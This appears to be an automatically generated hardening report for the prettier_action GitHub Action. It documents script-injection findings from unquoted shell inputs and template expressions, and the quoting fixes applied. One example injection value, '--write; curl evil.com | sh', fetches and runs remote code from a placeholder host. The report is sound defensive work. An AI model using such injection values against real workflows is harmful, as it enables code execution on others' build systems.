<!-- markdownlint-disable -->

# Hardening Report: creyD--prettier_action/v4.5

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **creyD--prettier_action/v4.5** was hardened automatically. 2 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): A `${{ github.action_path }}` expression is directly interpolated inside the `run:` shell command string in action.yml. Any `${{ ... }}` expression directly in a `run:` block is a script-injection risk because the value is substituted into the shell command before the shell parses it. Offending line: `${{ github.action_path }}/entrypoint.sh`

Locations:

- `action.yml:76`

### script-injection (severity: high)

Sub-rule (b): Multiple unquoted shell variable expansions of env vars that hold workflow-controllable input values in entrypoint.sh. Unquoted expansions allow shell metacharacters (`;`, `|`, `&`, whitespace, globs) in the input values to be interpreted by the shell, enabling command injection.

1. Line 44: `npm install --silent prettier@$INPUT_PRETTIER_VERSION` — `$INPUT_PRETTIER_VERSION` is unquoted; an attacker-controlled version string with shell metacharacters would be interpreted.
2. Line 48: `for plugin in $INPUT_PRETTIER_PLUGINS` — `$INPUT_PRETTIER_PLUGINS` is unquoted; word-splitting on attacker-controlled content.
3. Line 55: `npm install --silent $INPUT_PRETTIER_PLUGINS` — `$INPUT_PRETTIER_PLUGINS` is unquoted.
4. Line 60: `prettier $INPUT_PRETTIER_OPTIONS` — `$INPUT_PRETTIER_OPTIONS` is unquoted; a value like `--write; curl evil.com | sh` would execute arbitrary commands.
5. Line 148: `git push origin ${INPUT_PUSH_OPTIONS:-}` — `$INPUT_PUSH_OPTIONS` is unquoted.

Locations:

- `entrypoint.sh:44`
- `entrypoint.sh:48`
- `entrypoint.sh:55`
- `entrypoint.sh:60`
- `entrypoint.sh:148`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

Fixed two script-injection findings:

1. action.yml (line 76): Replaced `${{ github.action_path }}/entrypoint.sh` with `$GITHUB_ACTION_PATH/entrypoint.sh` in the `run:` block. The GITHUB_ACTION_PATH env var is already available in composite steps, eliminating the need for the template expression.

2. entrypoint.sh (lines 44, 48, 55, 60, 148): Fixed all unquoted variable expansions:
   - Line 44: Quoted `"prettier@$INPUT_PRETTIER_VERSION"` to prevent metacharacter injection.
   - Lines 48 & 55: Used `read -ra PRETTIER_PLUGINS_ARRAY <<< "$INPUT_PRETTIER_PLUGINS"` to safely split the plugin list into a bash array, then used `"${PRETTIER_PLUGINS_ARRAY[@]}"` in the for loop and npm install.
   - Line 60: Used `read -ra PRETTIER_OPTIONS_ARRAY <<< "$INPUT_PRETTIER_OPTIONS"` and `prettier "${PRETTIER_OPTIONS_ARRAY[@]}"` to safely pass options.
   - Line 148: Used `read -ra PUSH_OPTIONS_ARRAY <<< "${INPUT_PUSH_OPTIONS:-}"` and `git push origin "${PUSH_OPTIONS_ARRAY[@]}"` to safely pass push options.

The bash array approach preserves the intended word-splitting behavior (multiple space-separated arguments) while preventing shell metacharacter injection.

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Fixed all 7 unquoted shell variable expansion vulnerabilities in entrypoint.sh. Replaced all instances of `if $INPUT_VAR; then` (variable used as a command) and `[ $INPUT_VAR = true ]` (unquoted variable in test) with properly quoted string comparisons: `if [ "$INPUT_VAR" = "true" ]; then`. Affected variables: INPUT_CLEAN_NODE_FOLDER (line ~77), INPUT_ONLY_CHANGED and INPUT_ONLY_CHANGED_PR (line ~82), INPUT_ONLY_CHANGED (line ~84), INPUT_DRY (line ~97), INPUT_NO_COMMIT (lines ~100 and ~109), INPUT_SAME_COMMIT (line ~113).

